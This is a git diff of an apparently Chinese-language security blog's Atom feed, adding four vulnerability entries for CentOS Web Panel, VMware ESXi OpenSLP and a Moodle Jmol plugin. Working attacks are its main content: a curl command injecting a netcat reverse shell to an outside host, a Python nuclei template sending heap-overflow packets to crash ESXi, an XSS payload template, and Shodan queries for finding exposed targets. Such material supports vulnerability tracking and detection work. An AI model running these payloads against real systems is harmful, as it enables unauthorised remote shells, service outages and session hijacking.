@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-25T09:45:36.754Z</updated>
+  <updated>2025-06-25T10:15:46.453Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,112 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CentOS Web Panel 未授权远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/25/github_1170031665/"/>
+    <id>http://example.com/2025/06/25/github_1170031665/</id>
+    <published>2025-06-25T10:15:46.458Z</published>
+    <updated>2025-06-25T10:15:46.453Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CentOS Web Panel 未授权远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48703</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CentOS Web Panel 存在未授权远程代码执行漏洞，攻击者可以通过构造特定的请求，无需认证即可在服务器上执行任意代码。</p><p><strong>产品厂商：</strong> CentOS Web Panel</p><p><strong>产品名称：</strong> CentOS Web Panel</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20344">https://github.com/rapid7/metasploit-framework/issues/20344</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>Unauthenticated remote code execution in CentOS Web Panel - CVE-2025-48703</p><h4 id="Basic-example"><a href="#Basic-example" class="headerlink" title="Basic example"></a>Basic example</h4><p>Working exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs command">$ curl -kis &#x27;https://127.0.0.1:52083/myuser/index.php?module=filemanager&amp;acc=changePerm&#x27; --data &#x27;fileName=.bashrc&amp;currentPath=/home/myuser&amp;t_total=`nc 1.2.3.4 9999 -e /bin/bash`&#x27;<br>$<br></code></pre></td></tr></table></figure><p>Courtesy of <a href="https://fenrisk.com/rce-centos-webpanel">https://fenrisk.com/rce-centos-webpanel</a></p><h4 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h4><p>Unauthenticated one-shot RCE on a popular web management panel is pretty cool.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CentOS Web Panel 未授权远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;st</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>VMware ESXi &amp; Horizon DaaS OpenSLP 缓冲区溢出漏洞</title>
+    <link href="http://example.com/2025/06/25/github_34286076/"/>
+    <id>http://example.com/2025/06/25/github_34286076/</id>
+    <published>2025-06-25T10:15:36.092Z</published>
+    <updated>2025-06-25T10:15:36.089Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> VMware ESXi &amp; Horizon DaaS OpenSLP 缓冲区溢出漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-5544</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> VMware ESXi和Horizon DaaS设备中的OpenSLP组件存在堆溢出漏洞，远程攻击者可通过网络访问利用此漏洞执行任意代码。</p><p><strong>产品厂商：</strong> VMware</p><p><strong>产品名称：</strong> ESXi &amp; Horizon DaaS</p><p><strong>搜索语法：</strong> http.title:”horizon daas”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12406">https://github.com/projectdiscovery/nuclei-templates/issues/12406</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>OpenSLP in ESXi and Horizon DaaS appliances contains a heap overwrite caused by a vulnerability in the OpenSLP component, letting remote attackers execute arbitrary code, exploit requires network access.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://vulncheck.com/xdb/51f10d5e647f">https://vulncheck.com/xdb/51f10d5e647f</a></li><li><a href="https://github.com/dgh05t/VMware_ESXI_OpenSLP_PoCs">https://github.com/dgh05t/VMware_ESXI_OpenSLP_PoCs</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:dgh05t&#x2F;VMware_ESXI_OpenSLP_PoCs.git</li><li><a href="https://vulncheck.com/xdb/8a8375ae7774">https://vulncheck.com/xdb/8a8375ae7774</a></li><li><a href="https://github.com/HynekPetrak/CVE-2019-5544_CVE-2020-3992">https://github.com/HynekPetrak/CVE-2019-5544_CVE-2020-3992</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:HynekPetrak&#x2F;CVE-2019-5544_CVE-2020-3992.git</li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-horizon-daas"><a href="#Shodan-Query-http-title-horizon-daas" class="headerlink" title="Shodan Query: http.title:&quot;horizon daas&quot;"></a>Shodan Query: <code>http.title:&quot;horizon daas&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; VMware ESXi &amp;amp; Horizon DaaS OpenSLP </summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Moodle LMS Jmol插件跨站脚本漏洞</title>
+    <link href="http://example.com/2025/06/25/github_2354866029/"/>
+    <id>http://example.com/2025/06/25/github_2354866029/</id>
+    <published>2025-06-25T10:15:25.972Z</published>
+    <updated>2025-06-25T10:15:25.969Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Moodle LMS Jmol插件跨站脚本漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-34032</li></ul><p><strong>漏洞类型：</strong> 跨站可执行脚本</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Moodle LMS Jmol插件6.1及之前版本中存在反射型跨站脚本(XSS)漏洞，攻击者可以通过构造恶意链接，在受害者的浏览器中执行任意JavaScript代码，从而劫持用户会话或操纵页面内容。</p><p><strong>产品厂商：</strong> Moodle</p><p><strong>产品名称：</strong> Moodle LMS Jmol Plugin</p><p><strong>影响版本：</strong> &lt;&#x3D; 6.1</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/c2b66349c9093079a556f2c7e21d680a7c7ccae3/http%2Fcves%2F2025%2FCVE-2025-34032.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c2b66349c9093079a556f2c7e21d680a7c7ccae3/http%2Fcves%2F2025%2FCVE-2025-34032.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs less"><br>id: CVE-2025-34032<br><br>info:<br>  name: Moodle LMS Jmol Plugin &lt;= 6.1 - Cross-Site Scripting<br>  author: madrobot,ritikchaddha<br>  severity: medium<br>  description: |<br>    A reflected cross-site scripting (XSS) vulnerability exists in the Moodle LMS Jmol plugin version 6.1 and prior via the data parameter in jsmol.php. The application fails to properly sanitize user input before embedding it into the HTTP response, allowing an attacker to execute arbitrary JavaScript in the victim&#x27;s browser by crafting a malicious link. This can be used to hijack user sessions or manipulate <span class="hljs-attribute">page content.</span><br><span class="hljs-attribute">  reference</span>:<br>    - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities/</span><br>    - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nvd.nist.gov/vuln/detail/CVE-2025-34032</span><br>  <span class="hljs-attribute">classification</span>:<br>    <span class="hljs-attribute">cvss-metrics</span>: <span class="hljs-attribute">CVSS</span>:<span class="hljs-number">3.1</span>/<span class="hljs-attribute">AV</span>:N/<span class="hljs-attribute">AC</span>:L/<span class="hljs-attribute">PR</span>:L/<span class="hljs-attribute">UI</span>:R/<span class="hljs-attribute">S</span>:C/<span class="hljs-attribute">C</span>:L/<span class="hljs-attribute">I</span>:L/<span class="hljs-attribute">A</span>:N<br>    <span class="hljs-attribute">cve-id</span>: CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">34032</span><br>    <span class="hljs-attribute">cvss-score</span>: <span class="hljs-number">5.4</span><br>    <span class="hljs-attribute">cwe-id</span>: CWE-<span class="hljs-number">80</span><br>  <span class="hljs-attribute">metadata</span>:<br>    <span class="hljs-attribute">max-request</span>: <span class="hljs-number">1</span><br>  <span class="hljs-attribute">tags</span>: cve,cve2025,moodle,xss,edb<br><br><span class="hljs-attribute">http</span>:<br>  - <span class="hljs-attribute">method</span>: GET<br>    <span class="hljs-attribute">path</span>:<br>      - <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&amp;data=%3Cscript%3Ealert(document.domain)%3C/script%3E&amp;mimetype=text/html&quot;</span><br><br>    <span class="hljs-attribute">matchers-condition</span>: <span class="hljs-keyword">and</span><br>    <span class="hljs-attribute">matchers</span>:<br>      - <span class="hljs-attribute">type</span>: dsl<br>        <span class="hljs-attribute">dsl</span>:<br>          - <span class="hljs-string">&#x27;len(body) == 41&#x27;</span><br>          - <span class="hljs-string">&#x27;status_code == 200&#x27;</span><br>          - <span class="hljs-string">&#x27;contains(content_type, &quot;text/html&quot;)&#x27;</span><br>        <span class="hljs-attribute">condition</span>: <span class="hljs-keyword">and</span><br><br>      - <span class="hljs-attribute">type</span>: regex<br>        <span class="hljs-attribute">regex</span>:<br>          - <span class="hljs-string">&#x27;^&lt;script&gt;alert\(document\.domain\)&lt;/script&gt;\s*$&#x27;</span><br># <span class="hljs-attribute">digest</span>: <span class="hljs-number">490</span><span class="hljs-attribute">a0046304402202ce4ab09dfbb0d1a283ed44ecf36d605d0ca9b1daf7c865bc6dff2377cae6fe302201755c894c9fb9d830625ffad6822664793240ae4e1f14fd340b92b5c2be20517</span>:<span class="hljs-number">922</span>c64590222798bb761d5b6d8e72950<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Moodle LMS Jmol插件跨站脚本漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="跨站可执行脚本" scheme="http://example.com/tags/%E8%B7%A8%E7%AB%99%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>VMware ESXi SLP - Heap Overflow DoS (CVE-2019-5544)</title>
+    <link href="http://example.com/2025/06/25/github_495535210/"/>
+    <id>http://example.com/2025/06/25/github_495535210/</id>
+    <published>2025-06-25T10:15:14.482Z</published>
+    <updated>2025-06-25T10:15:14.476Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> VMware ESXi SLP - Heap Overflow DoS (CVE-2019-5544)</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-5544</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> VMware ESXi和Horizon DaaS设备中的OpenSLP组件存在堆溢出漏洞，允许拒绝服务攻击和远程攻击者执行任意代码。</p><p><strong>产品厂商：</strong> VMware</p><p><strong>产品名称：</strong> VMware ESXi</p><p><strong>搜索语法：</strong> http.title:”horizon daas”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/d3991965e983ba0c92c72a3508edc0b0fe0fbdfd/code%2Fcves%2F2019%2FCVE-2019-5544.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/d3991965e983ba0c92c72a3508edc0b0fe0fbdfd/code%2Fcves%2F2019%2FCVE-2019-5544.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">5544</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> VMware ESXi SLP <span class="hljs-operator">-</span> Heap Overflow DoS (CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">5544</span>)<br>  <span class="hljs-params">author:</span> riteshs4hu<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    OpenSLP <span class="hljs-keyword">in</span> ESXi and Horizon DaaS appliances contains a heap overwrite caused by a vulnerability <span class="hljs-keyword">in</span> the OpenSLP component, letting DoS and remote attackers execute arbitrary code.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2019-5544</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/dgh05t/VMware_ESXI_OpenSLP_PoCs</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> http.title:<span class="hljs-string">&quot;horizon daas&quot;</span><br>    <span class="hljs-params">tags:</span> cve,cve2019,vmware,esxi,overflow,dos<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">target:</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> python3<br>    <span class="hljs-params">source:</span> |<br>      <span class="hljs-built_in">import</span> socket<br>      <span class="hljs-built_in">import</span> os<br>      <span class="hljs-built_in">import</span> time<br><br>      <span class="hljs-attr">target</span> <span class="hljs-operator">=</span> os.environ.get(<span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>)<br>      <span class="hljs-attr">serverAddr</span> <span class="hljs-operator">=</span> (target, <span class="hljs-number">427</span>)<br><br>      def is_port_open(address, port, timeout<span class="hljs-operator">=</span><span class="hljs-number">3</span>):<br>          <span class="hljs-attr">sock</span> <span class="hljs-operator">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>          sock.settimeout(timeout)<br>          <span class="hljs-attr">result</span> <span class="hljs-operator">=</span> sock.connect_ex((address, port))<br>          sock.close()<br>          return result <span class="hljs-operator">==</span> <span class="hljs-number">0</span><br><br>      <span class="hljs-keyword">if</span> not is_port_open(target, <span class="hljs-number">427</span>):<br>          print(f<span class="hljs-string">&quot;Port 427 is closed or filtered on &#123;target&#125;&quot;</span>)<br>      <span class="hljs-params">else:</span><br>          <span class="hljs-comment"># Prepare malicious payloads</span><br>          <span class="hljs-attr">header</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>02&quot;</span>  <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>03&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>10<span class="hljs-char escape_">\x</span>5e&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>66<span class="hljs-char escape_">\x</span>0d&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>02&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>6e&quot;</span><br>          <span class="hljs-attr">UrlEntry1</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>10<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>14&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;http://www.baidu.com&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>01&quot;</span><br>          <span class="hljs-attr">authblock</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>10<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>01<span class="hljs-char escape_">\x</span>01<span class="hljs-char escape_">\x</span>01<span class="hljs-char escape_">\x</span>01&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>0f<span class="hljs-char escape_">\x</span>f6&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;y&quot;</span> <span class="hljs-operator">*</span> <span class="hljs-number">0</span>xff6<br>          <span class="hljs-attr">service_type</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>1c&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;service:VMwareInfrastructure&quot;</span><br>          <span class="hljs-attr">scope_list</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>07&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;default&quot;</span><br>          <span class="hljs-attr">attribute_list</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>0a&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;pppppppppp&quot;</span><br>          <span class="hljs-attr">authcount</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00&quot;</span><br>          <span class="hljs-attr">poc_1</span> <span class="hljs-operator">=</span> header <span class="hljs-operator">+</span> UrlEntry1 <span class="hljs-operator">+</span> authblock <span class="hljs-operator">+</span> service_type <span class="hljs-operator">+</span> scope_list <span class="hljs-operator">+</span> attribute_list <span class="hljs-operator">+</span> authcount<br><br>          <span class="hljs-attr">header</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>02&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>01&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>47&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>02&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>6e&quot;</span><br>          <span class="hljs-attr">srvrqst</span> <span class="hljs-operator">=</span> (<br>              b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>0a&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;1234567890&quot;</span> <span class="hljs-operator">+</span><br>              b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>1c&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;service:VMwareInfrastructure&quot;</span> <span class="hljs-operator">+</span><br>              b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>07&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;default&quot;</span> <span class="hljs-operator">+</span><br>              b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span> <span class="hljs-operator">+</span> b<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span><br>          )<br>          <span class="hljs-attr">poc_2</span> <span class="hljs-operator">=</span> header <span class="hljs-operator">+</span> srvrqst<br><br>          <span class="hljs-attr">tcpClientSocket</span> <span class="hljs-operator">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>          <span class="hljs-params">try:</span><br>              tcpClientSocket.connect(serverAddr)<br>              tcpClientSocket.send(poc_1)<br>              tcpClientSocket.send(poc_2)<br>              tcpClientSocket.close()<br>              time.sleep(<span class="hljs-number">2</span>)<br>              <span class="hljs-keyword">if</span> not is_port_open(target, <span class="hljs-number">427</span>):<br>                  print(<span class="hljs-string">&quot;success!&quot;</span>)<br>              <span class="hljs-params">else:</span><br>                  print(<span class="hljs-string">&quot;not closed&quot;</span>)<br>          except <span class="hljs-params">ConnectionRefusedError:</span><br>              print(<span class="hljs-string">&quot;connection refused&quot;</span>)<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;success!&quot;</span><br><span class="hljs-comment"># digest: 4b0a00483046022100efc389c9eb6e48aa1c1e2d6be348b0606a1c41536b360701be62498345575ca4022100af1f90f5aa47cfeb535129058ff0cecdecb841dd60d95c37d10662b10ddb62d2:e68ba7c09b3cfa8cfd81e2c1f06c37c6</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; VMware ESXi SLP - Heap Overflow DoS (CV</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
+    
+  </entry>
   
   <entry>
     <title>Brother MFC-L9570CDW 信息泄露漏洞</title>
@@ -443,114 +549,6 @@
